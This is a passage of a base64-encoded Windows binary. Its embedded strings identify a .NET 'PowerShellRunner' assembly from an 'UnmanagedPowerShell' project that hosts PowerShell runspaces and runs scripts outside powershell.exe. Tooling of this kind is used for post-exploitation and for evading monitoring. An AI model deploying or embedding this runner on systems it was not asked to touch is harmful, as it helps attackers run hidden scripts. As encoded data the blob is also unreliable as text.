pemUATWF4V2luZG93U2l6ZQBXaW5kb3dQb3NpdGlvbgBXaW5kb3dTaXplAFdpbmRvd1RpdGxlAGNvbW1hbmQAZXhpdENvZGUAZm9yZWdyb3VuZENvbG9yAGJhY2tncm91bmRDb2xvcgB2YWx1ZQBtZXNzYWdlAHNvdXJjZUlkAHJlY29yZABjYXB0aW9uAGRlc2NyaXB0aW9ucwBjaG9pY2VzAGRlZmF1bHRDaG9pY2UAdXNlck5hbWUAdGFyZ2V0TmFtZQBhbGxvd2VkQ3JlZGVudGlhbFR5cGVzAG9wdGlvbnMAcmVjdGFuZ2xlAHNvdXJjZQBkZXN0aW5hdGlvbgBjbGlwAGZpbGwAb3JpZ2luAGNvbnRlbnRzAFN5c3RlbS5SZWZsZWN0aW9uAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUN1bHR1cmVBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAENvbVZpc2libGVBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBBc3NlbWJseVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnYWJsZUF0dHJpYnV0ZQBEZWJ1Z2dpbmdNb2RlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMASW5pdGlhbFNlc3Npb25TdGF0ZQBDcmVhdGVEZWZhdWx0AEF1dGhvcml6YXRpb25NYW5hZ2VyAHNldF9BdXRob3JpemF0aW9uTWFuYWdlcgBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AENvbW1hbmQAZ2V0X0l0ZW0AUGlwZWxpbmVSZXN1bHRUeXBlcwBNZXJnZU15UmVzdWx0cwBBZGQASW52b2tlAElEaXNwb3NhYmxlAERpc3Bvc2UAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAZ2V0X0N1cnJlbnRUaHJlYWQATm90SW1wbGVtZW50ZWRFeGNlcHRpb24ATmV3R3VpZABBcHBlbmQAU3RyaW5nAENvbmNhdABBcHBlbmRMaW5lAFRvU3RyaW5nAHNldF9XaWR0aABzZXRfSGVpZ2h0AHNldF9YAHNldF9ZAAAAF28AdQB0AC0AZABlAGYAYQB1AGwAdAABGUMAdQBzAHQAbwBtAFAAUwBIAG8AcwB0AACBd0UAbgB0AGUAcgBOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF1RQB4AGkAdABOAGUAcwB0AGUAZABQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAQMKAAAPRABFAEIAVQBHADoAIAAAD0UAUgBSAE8AUgA6ACAAABNWAEUAUgBCAE8AUwBFADoAIAAAE1cAQQBSAE4ASQBOAEcAOgAgAACBYVAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgXNQAHIAbwBtAHAAdABGAG8AcgBDAGgAbwBpAGMAZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAxACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgX1QAHIAbwBtAHAAdABGAG8AcgBDAHIAZQBkAGUAbgB0AGkAYQBsADIAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBZVIAZQBhAGQATABpAG4AZQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYGBUgBlAGEAZABMAGkAbgBlAEEAcwBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAUlGAGwAdQBzAGgASQBuAHAAdQB0AEIAdQBmAGYAZQByACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAAS0cAZQB0AEIAdQBmAGYAZQByAEMAbwBuAHQAZQBuAHQAcwAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQB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